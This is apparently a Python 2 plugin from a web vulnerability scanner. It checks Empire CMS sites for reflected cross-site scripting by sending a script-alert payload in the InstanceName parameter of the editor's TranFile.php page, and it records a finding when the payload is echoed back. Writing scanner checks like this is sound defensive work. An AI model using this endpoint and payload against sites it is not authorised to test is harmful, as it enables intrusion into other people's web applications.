#!/usr/bin/env python
# -*- coding: utf-8 -*-
from lib.common import *

def run_domain(http,ob):
    list = []
    try:
        domain = ob['domain']
        detail = u''
        detail = detail.encode('utf8')
    
        url = "%s://%s/" % (ob['scheme'],domain)
        url += "e/data/ecmseditor/infoeditor/epage/TranFile.php?InstanceName=\"><script>alert(123)</script>"
        res, content = requestUrl(http,url,ob['task_id'],ob['domain_id'])
        if res['status'] == '200' and content.find('<script>alert(123)</script>')>=0:
            request = getRequest(url)
            response = getResponse(res)            
            list.append(getRecord(ob,url,ob['level'],detail,request,response))
    except Exception,e:
        logging.getLogger().error("File:Empire_TranFile_XssScript.py, run_domain function :" + str(e) + ",task id:" + ob['task_id'] + ",domain id:" + ob['domain_id'])
        write_scan_log(ob['task_id'],ob['domain_id'],"File:Empire_TranFile_XssScript.py, run_domain function :" + str(e))
    #end try
    
    return list
#end def
